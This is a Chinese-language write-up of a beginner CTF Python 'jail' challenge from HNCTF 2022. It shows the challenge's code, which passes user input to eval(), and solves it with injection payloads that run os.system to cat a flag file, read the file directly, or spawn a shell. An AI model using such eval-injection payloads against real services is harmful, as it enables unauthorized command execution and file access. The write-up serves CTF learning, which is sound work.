## [HNCTF 2022 Week1]calc_jail_beginner(JAIL)
### 题目：
- 打开后会给一个url，无法直接访问，使用虚拟机kali远程nc连接上，发现是一段代码，在一次比赛中接触到并得知这种题叫做沙盒逃逸jail。我们需要给环境中置入访问内容的payload导入外部模块
-下面是begin的代码，直接给出
```
#Your goal is to read ./flag.txt
#You can use these payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())`

WELCOME = '''
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
'''

print(WELCOME)

print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
print('Answer: {}'.format(eval(input_data)))
```
### 解题思路和过程：
- 这里是最基础的没有任何限制的情况，使用题目中给出的提示payload来访问，比如__import__('os').system('cat ./flag.txt')或者print(open('/flag.txt').read())。
- 还有一种更加通用的反弹shell的方式为__import__('os').system('sh')，这样可以直接连接sh并查看文件。